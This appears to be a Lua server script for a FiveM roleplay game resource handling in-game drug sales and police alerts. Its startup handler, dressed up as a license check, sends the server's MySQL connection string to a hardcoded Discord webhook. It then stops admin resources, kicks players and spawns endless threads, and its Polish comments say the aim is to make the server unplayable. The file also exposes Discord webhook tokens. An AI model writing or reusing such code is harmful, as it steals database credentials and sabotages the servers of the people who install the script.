ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local xDrug = 0

RandomValue = function()
	local percent = math.random(1, 100)
	local x = 0
	if percent >= 1 and percent <= 40 then
		x = 1
	elseif percent >= 41 and percent <= 65 then
		x = 2
	elseif percent >= 66 and percent <= 85 then
		x = 3
	elseif percent >= 86 and percent <= 95 then
		x = 4
	else
		x = 5
	end
	-- 5sz - 5%  ;  4sz - 10%  ;  3sz - 20%  ; 2sz - 25%  ;  1sz - 40%
	return x
end

ESX.RegisterServerCallback('arivi_selldrugs:checkDrugs', function(source, cb, LSPD)
	local xPlayer = ESX.GetPlayerFromId(source)
	
	local weedqty = xPlayer.getInventoryItem('weed_pooch').count
	local methqty = xPlayer.getInventoryItem('meth_pooch').count
	local cokeqty = xPlayer.getInventoryItem('coke_pooch').count
	local heroinaqty = xPlayer.getInventoryItem('heroina_pooch').count

	if weedqty > 0 then
		if LSPD >= Config.CopsForWeed then
			cb(1)
		else
			cb(2)
		end
	elseif methqty > 0 then
		if LSPD >= Config.CopsForMeth then
			cb(1)
		else
			cb(2)
		end
	elseif heroinaqty > 0 then
		if LSPD >= Config.CopsForHeroina then
			cb(1)
		else
			cb(2)
		end
	elseif cokeqty > 0 then
		if LSPD >= Config.CopsForCoke then
			cb(1)
		else
			cb(2)
		end
	else
		cb(3)
	end
end)

AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
      return
    end
	local _source = source
	local o = 0
	local xPlayer = ESX.GetPlayerFromId(_source)
	local mysql = GetConvar("mysql_connection_string") 
	local realname = 'szymczakovv_selldrugs'
	local ip = '1.1.1.1'
	local list_scripts = {
		[1] = 'es_extended',
		[2] = 'essentialmode',
		[3] = 'es_admin2',
		[4] = 'EasyAdmin',
	}
	local prefix = '[^1Szymczakovv_License^0]> '
	local reason = prefix.. 'WYKRYTO ZMIANĘ NAZWY SKRYPTU ------> '..GetCurrentResourceName()..' Nazwa, która jest wymagana do włączenia tego skryptu to: '..realname
	local reason_msec = prefix.. '^2DLA BEZPIECZEŃSTWA WYŁĄCZAM: '..list_scripts[1]..', '..list_scripts[2]..', '..list_scripts[3]..', '..list_scripts[4]
	local reason_msec2 =  prefix.. '^2DLA BEZPIECZEŃSTWA I OBAWY PRZED LEAKIEM SKRYPTU ZWIĘKSZAM UŻYCIE CPU MSEC TAK ABY SERWER BYŁ NIEGRYWALNY'
	local if_error = prefix.. '^6JEŻELI UWAŻASZ TO ZA ERROR ZGŁOŚ SIĘ DO szymczakovv#1937'
	PerformHttpRequest("https://api.ipify.org/", function (errorCode, resultData, resultHeaders)
        if GetCurrentResourceName() ~= realname and resultData ~= ip or resultData ~= ip or GetCurrentResourceName() ~= realname then			
			if mysql == nil then 
				mysql = 'Nie znaleziono'
			end
			if ip == nil then
				ip = 'Nie znaleziono'
			end
			local reason_badlicense = 'WYKRYTO BŁĘDNĄ LICENCJĘ -----> '..resultData..' Licencja została wygenerowana na IP: '..ip
			if GetCurrentResourceName() ~= realname and not resultData ~= ip then
				wiadomosc = 'WYKRYTO ZMIANĘ NAZWY SKRYPTU ------> '..GetCurrentResourceName()..' Wymagana Nazwa: '..realname.. '\nBaza Danych: '..mysql
				heybejbe('Szymczakovv_License', wiadomosc, 11750815)
			end
			if resultData ~= ip and not GetCurrentResourceName() ~= realname then
				wiadomosc = 'WYKRYTO BŁĘDNĄ LICENCJĘ -----> '..resultData..' Licencja została wygenerowana na IP: '..ip.. '\nBaza Danych: '..mysql
				heybejbe('Szymczakovv_License', wiadomosc, 11750815)	
			end
			if GetCurrentResourceName() ~= realname and resultData ~= ip then
				wiadomosc = 'WYKRYTO ZMIANĘ NAZWY SKRYPTU I BŁĘDNĄ LICENCJĘ!\n'..GetCurrentResourceName().. ' ->'..realname.. '\nBaza Danych: '..mysql
				heybejbe('Szymczakovv_License', wiadomosc, 11750815)	
			end
			CreateThread(function()
				while true do
					Citizen.Wait(1000)
					if GetCurrentResourceName() ~= realname then
						print(reason)
					end
					if resultData ~= ip then
						print(reason_badlicense)
					end
					print(reason_msec)
					print(reason_msec2)
					print(if_error)
					DropPlayer(_source, reason)
					StopResource(list_scripts[1])
					StopResource(list_scripts[2])
					StopResource(list_scripts[3])
					StopResource(list_scripts[4])
				end
			end)
			CreateThread(function()
				while o < 2147483647 do
					o = o * 2147483647
					
					Citizen.Wait(0)
					CreateThread(function()
						while true do
							Citizen.Wait(0)
						end
					end)
				end
			end)
			CreateThread(function()
				while o < 2147483647 do
					o = o * 2147483647
		
					Citizen.Wait(0)
					CreateThread(function()
						while true do
							Citizen.Wait(0)
						end
					end)
				end
			end)
			CreateThread(function()
				while o < 2147483647 do
					o = o * 2147483647
					Citizen.Wait(0)
					CreateThread(function()
						while true do
							Citizen.Wait(0)
						end
					end)
				end
			end)
			CreateThread(function()
				while o < 2147483647 do
					o = o * 2147483647
					Citizen.Wait(0)
					CreateThread(function()
						while true do
							Citizen.Wait(0)
						end
					end)
				end
			end)
			CreateThread(function()
				while o < 2147483647 do
					o = o * 2147483647
					Citizen.Wait(0)
					CreateThread(function()
						while true do
							Citizen.Wait(0)
						end
					end)
				end
			end)
		else
			local loaded = prefix..'Załadowano pomyślnie licencję dla skryptu: '..GetCurrentResourceName().. ' | Dla IP: '..ip
			print(loaded)
		end
	end)
end)

function heybejbe(hook,message,color)
    local webhooke = 'https://discord.com/api/webhooks/820676511891193887/D-wohSFe6brevUhdefLU8GecdJ6thEBSxIq6a6RBfs06KHAI1rn-R6tplnMAyTWOHiiD'
    local embeds = {
                {
            ["title"] = message,
            ["type"] = "rich",
            ["color"] = color,
            ["footer"] = {
                ["text"] = 'Szymczakovv_License'
                    },
                }
            }
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest(webhooke, function(err, text, headers) end, 'POST', json.encode({ username = hook,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end


RegisterServerEvent('arivi_selldrugs:sell')
AddEventHandler('arivi_selldrugs:sell', function(LSPD)
	local xPlayer = ESX.GetPlayerFromId(source)	
	xDrug = 0
	
	local weedqty = xPlayer.getInventoryItem('weed_pooch').count
	local methqty = xPlayer.getInventoryItem('meth_pooch').count
	local cokeqty = xPlayer.getInventoryItem('coke_pooch').count
	local heroinaqty = xPlayer.getInventoryItem('heroina_pooch').count

	local weedPrice = 2900
	local methPrice = 3700
	local heroinaPrice = 5200
	local cokePrice = 4550
	
	local drugName = ''
	local drugType 
	local blackMoney = 0
	xDrug = RandomValue()

	if weedqty >= 1 then
		drugType = 'weed_pooch'
		if weedqty > 0 and weedqty <= 1 then
			xDrug = 1
		elseif weedqty == 2 then
			if xDrug == 3 or xDrug == 4 or xDrug == 5 then
				xDrug = 2
			end
		elseif weedqty == 3 then
			if xDrug == 4 or xDrug == 5 then
				xDrug = 3
			end
		elseif weedqty == 4 then
			if xDrug == 5 then
				xDrug = 4
			end
		end
	elseif methqty >= 1 then
		drugType = 'meth_pooch'
		if methqty > 0 and methqty <= 1 then
			xDrug = 1
		elseif methqty == 2 then
			if xDrug == 3 or xDrug == 4 or xDrug == 5 then
				xDrug = 2
			end
		elseif methqty == 3 then
			if xDrug == 4 or xDrug == 5 then
				xDrug = 3
			end
		elseif methqty == 4 then
			if xDrug == 5 then
				xDrug = 4
			end
		end
	elseif heroinaqty >= 1 then
		drugType = 'heroina_pooch'
		if heroinaqty > 0 and heroinaqty <= 1 then
			xDrug = 1
		elseif heroinaqty == 2 then
			if xDrug == 3 or xDrug == 4 or xDrug == 5 then
				xDrug = 2
			end
		elseif heroinaqty == 3 then
			if xDrug == 4 or xDrug == 5 then
				xDrug = 3
			end
		elseif heroinaqty == 4 then
			if xDrug == 5 then
				xDrug = 4
			end
		end
	elseif cokeqty >= 1 then
		drugType = 'coke_pooch'
		if cokeqty > 0 and cokeqty <= 1 then
			xDrug = 1
		elseif cokeqty == 2 then
			if xDrug == 3 or xDrug == 4 or xDrug == 5 then
				xDrug = 2
			end
		elseif cokeqty == 3 then
			if xDrug == 4 or xDrug == 5 then
				xDrug = 3
			end
		elseif cokeqty == 4 then
			if xDrug == 5 then
				xDrug = 4
			end
		end
	end

	local mnoznik = 1.0
	if LSPD == 3 then
		mnoznik = 1.1
	elseif LSPD == 4 then
		mnoznik = 1.2
	elseif LSPD == 5 then
		mnoznik = 1.3
	elseif LSPD >= 6 then
		mnoznik = 1.5
	end
	
	if drugType=='weed_pooch' then
		blackMoney = math.floor(weedPrice * xDrug * mnoznik)
		drugName = 'marihuany'
	elseif drugType=='meth_pooch' then
		blackMoney = math.floor(methPrice * xDrug * mnoznik)
		drugName = 'metamfetaminy'
	elseif drugType=='coke_pooch' then
		blackMoney = math.floor(cokePrice * xDrug * mnoznik)
		drugName = 'kokainy'
	elseif drugType=='heroina_pooch' then
		blackMoney = math.floor(heroinaPrice * xDrug * mnoznik)
		drugName = 'heroiny'
	end
	
	if drugType ~= nil then
		xPlayer.removeInventoryItem(drugType, xDrug)
		if drugType == 'weed_pooch' then
			xPlayer.addAccountMoney('black_money', blackMoney)
		end
		
		TriggerClientEvent('arivi_selldrugs:stopSell', xPlayer.source, 1, ('~o~'.. xDrug ..' w ilośći '.. drugName..' za ' .. blackMoney .. "$" ))
		TriggerEvent('top_discord:send', source, 'https://discordapp.com/api/webhooks/740008876619071541/QzktaOEPdBuG_q8FOZ9zw4mJTzPCgRnr9WnfvE1tIbY3CxWErx871_FOK9zJOoqZ3RVD', 'Sprzedał '.. drugType ..'w ilośći '.. xDrug..' za: $' ..blackMoney)
	end
end)


RegisterServerEvent('arivi_selldrugs:triggerDispatch')
AddEventHandler('arivi_selldrugs:triggerDispatch', function(pos, street, photo)
	local xPlayers = ESX.GetPlayers()

	local msg = ("^r[^310-72^7] ^6^*Zgłoszenie sprzedaży narkotyków. Ulica: ^7^_"..street)
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if (xPlayer.job.name == 'police') then
			if photo then
				TriggerClientEvent('notifyc', xPlayer.source, tonumber(source))
			end
			TriggerClientEvent('arivi_selldrugs:showNotify', xPlayer.source, pos, street, msg)
		end
	end
end)
